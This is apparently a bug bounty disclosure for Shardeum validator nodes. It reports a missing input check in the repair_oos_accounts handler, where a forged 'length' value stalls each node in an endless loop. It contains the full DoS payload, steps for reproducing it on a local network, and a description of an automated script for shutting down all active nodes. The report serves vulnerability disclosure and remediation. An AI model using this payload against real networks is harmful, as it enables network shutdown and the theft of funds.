# 34012 - \[BC - Critical] Improper input validation in repair\_oos\_account...

## Improper input validation in repair\_oos\_accounts leads to DOS and total network shutdown

Submitted on Aug 4th 2024 at 05:34:23 UTC by @neplox for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #34012

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardeum/tree/dev>

Impacts:

* Direct loss of funds
* Network not being able to confirm new transactions (total network shutdown)

### Description

### Brief/Intro

Shardeum validator nodes implemented in the <https://github.com/shardeum/shardeum> repository are vulnerable to complete DOS due to lack of input validation in `repair_oos_accounts` (<https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/state-manager/AccountPatcher.ts#L336>) and `repairMissingAccountsBinary` (<https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/state-manager/AccountPatcher.ts#L489>) internal endpoints. Exploitation leads to a complete stall of all of the active validator node's processes, and due to the simplicity of the exploit, it is possible to execute it on all active nodes. A more sophisticated attack would involve shutting down only a large part of the nodes, but not all, for attacker-controlled nodes to be the only ones available, which can then be used to overtake the whole network.

### Vulnerability Details

In `repairMissingAccountsBinary` and `repair_oos_accounts` handlers, there is a loop that iterates up to `receivedBestVote.account_id.length` <https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/state-manager/AccountPatcher.ts#L413>

```
for (let i = 0; i < receivedBestVote.account_id.length; i++) {
  if (receivedBestVote.account_id[i] === accountID) {
    if (receivedBestVote.account_state_hash_after[i] !== calculatedAccountHash) {
      nestedCountersInstance.countEvent('accountPatcher', `repair_oos_accounts: account hash mismatch for txId: ${txId}`)
      accountHashMatch = false
    } else {
      accountHashMatch = true
    }
       break
    }
}
```

The issue arises from the fact that `receivedBestVote` is a request parameter and is not validated to be an array, which allows an attacker to pass the following object as part of the request data:

```
"appliedVote":sign({
  "node_id":NODE_ID,
  "transaction_result":"result",
  "account_id":{
    length: 10000000000000000000000000000000000000000000
  }
})
```

This will cause NodeJS to go into an infinite loop because the value `10000000000000000000000000000000000000000000` is greater than Number.MAX\_SAFE\_INTEGER. Due to how NodeJS works, this will block the process' event loop thread, and no other logic will be able to run, practically shutting the validator node down and making it simply infinitely waste CPU cycles.

### Impact Details

The most basic outcome would be a total network shutdown caused by exploiting the DOS vulnerability on each active validator node. Since exploitation does not cause the nodes' processes to actually shut down or crash, the whole network will just stop processing any requests and user transactions. So that actually starting the network back up would require a fix to be deployed to all nodes, making it more difficult to mitigate.

A more complex attack scenario, as said in the intro, would be the shutdown of nearly all, but not all, validator nodes, so that attackers nodes would be the only ones left available. Which would leave the whole network to be controlled by the attacker. This means the network will continue functioning, but the attacker will be able to execute any transaction they want, and drain all the funds to themselves.

### References

JavaScript max and min safe-to-use number values: <https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global\\_Objects/Number/MAX\\_SAFE\\_INTEGER>, <https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global\\_Objects/Number/MIN\\_SAFE\\_INTEGER>

## Proof of concept

This POC was written in order to demonstrate total network shutdown as the main impact, as fund loss would be an impact that would follow due to all validator nodes except the attacker's being crippled. In order to simplify the POC only the main impact of validator node DOS is implemented.

`poc.js` contained in the attached [gist](https://gist.github.com/Slonser/3434c9d6f30b598da84e0746438e27fb) contains the main exploit code for automatically disabling all the active nodes of the network after retrieving their addresses from the archiver. This writeup is present just to showcase exactly how it was tested and how it works.

### Local Shardeum network setup

This vulnerability is equally exploitable with any number of nodes as exploitation of a single validator node requires sending just a single message via the internal protocol. For demonstration purposes, however, a network with only 32 validator nodes is created.

Any Shardeum network using the current validator node code will be vulnerable, so it is not necessary to follow these exact steps. They are here just to showcase how the POC was tested by me.

1. Clone the Shardeum repo and switch to the last commit on the `dev` branch, which is `c7b10c2370028f7c7cbd2a01839e50eb50faa904` as of this POC's submission.

   ```bash
   git clone https://github.com/shardeum/shardeum.git
   cd shardeum
   git switch --detach c7b10c2370028f7c7cbd2a01839e50eb50faa904
   ```
2. Switch to NodeJS 18.16.1, which is the version used by Shardeum in `dev.Dockerfile` and its various library requirements. For example, using asdf (<https://asdf-vm.com/>):

   ```bash
   asdf install nodejs 18.16.1
   asdf local nodejs 18.16.1
   ```
3. Apply the `network-32.patch` file from the attached [gist](https://gist.github.com/Slonser/3434c9d6f30b598da84e0746438e27fb) for network setup. Note that it DOES NOT enable debug mode, demonstrating the vulnerability in a semi-realistic release setup.

   ```bash
   git apply network-32.patch
   ```
4. Install dependencies and build the project.

   ```bash
   npm ci
   npm run prepare
   ```
5. Launch the network with 32 nodes as specified in the patch using the `shardus` tool.

   ```bash
   npx shardus create 32
   ```

After this step, 15-20 minutes are required as usual for at least some validator nodes to go into being active, at which point the exploit itself can be ran. I used the <http://localhost:3000/> monitor to wait for nodes to start activating.

### JSON-RPC API setup

To simplify the POC, Shardeum's `json-rpc-server` is used to interact with the network, specifically, to send a single stake transaction using the attacker's account, to use its ID later with the `repair_oos_accounts` endpoint.

1. Clone the `json-rpc-server` repo and switch to the last commit on the `dev` branch, which is `c3c462a4b18bc7517e086ff70f08ae6afede3b31` as of this POC's submission.

   ```bash
   git clone https://github.com/shardeum/json-rpc-server.git
   cd json-rpc-server
   git switch --detach c3c462a4b18bc7517e086ff70f08ae6afede3b31
   ```
2. Switch to NodeJS 18.16.1, which is the version used by `json-rpc-server` in `Dockerfile` and its various library requirements. For example, using asdf (<https://asdf-vm.com/>):

   ```bash
   asdf install nodejs 18.16.1
   asdf local nodejs 18.16.1
   ```
3. Install dependencies.

   ```bash
   npm install
   ```
4. Launch the JSON RPC server. This must be done once the Shardeum network is at least partially active, for the server to receive and be able to interact with valid archiver and validator nodes.

   ```bash
   npm run start
   ```

### DOS exploitation for network shutdown

As said in the introduction, `poc.js` from the attached [gist](https://gist.github.com/Slonser/3434c9d6f30b598da84e0746438e27fb) contains the exploit code and can be ran on any network as long as a valid archiver URL and Attacker validator node info is suplied It can be ran using `NodeJS`, requires a few of the Shardus packages (`@shardus/crypto-utils`, `@shardus/net`, `@shardus/types`) as well as `ether` and `axios` libraries to be installed, as specified in the attached [`package.json`](https://gist.github.com/Slonser/3434c9d6f30b598da84e0746438e27fb). Following is a detailed writeup of how it works:

**NOTE**: modify the `keypair` and `NODE_ID` variables with the values of one of the nodes in the network, for the POC to simulate requests from an attacker-controlled validator node. The keypair should be set to the contents of a node's secrets.json, and NODE\_ID can be set to the value of id retrieved from a node's /nodeinfo endpoint.

1. A request to the specified archiver's `full-nodelist` endpoint is made in order to retrive the full list of validator active nodes in the network. Running the DOS on these nodes means that no more nodes will be available, leading to a total shutdown of the network.
2. Each node's `/nodeinfo` endpoint is queried to retrieve the `internalIp`, `internalPort` and `id` values
3. Using getTxId, we create a new transaction (it doesn't matter if it succeeds or not). This is done to obtain a txId that will be used in the future.
4. A message with payload of the form

   ```
      repairInstructions:[{
      "accountID": "0000000000000000000000000000000000000000",
      "txId": txId,
      "hash":"1231231231231231231231231",
      "accountData":{
        "data":{
            "accountType":6,
            "account":{
                "storageRoot":{
                    "data":{
                        "length": 16
                    }
                },
                "codeHash":{
                    "data":{
                        "length": 16
                    }
                }
            }
        }
     },
      "targetNodeId": nodeAddr.id,
      "receipt2":{
        "appliedVote":sign({
            "node_id":NODE_ID,
            "transaction_result":"result",
            "account_id":{
              length: 10000000000000000000000000000000000000000000
            }
        })
      }
    }]
   ```

   is sent using the internal protocol to `repair_oos_accounts` handler triggering the vulnerability. Inifinite `for` loop execution will then block NodeJS' event loop, making each active validator node unresponsive and practically stopping the network.

Shardeum's monitor dashboard, launched by default on <http://localhost:3000/> can be used to check that all active nodes will be now marked as red as they go offline and stop reporting to the monitor. Making any request to the validator nodes will hang, as the network is completely stopped at this point.
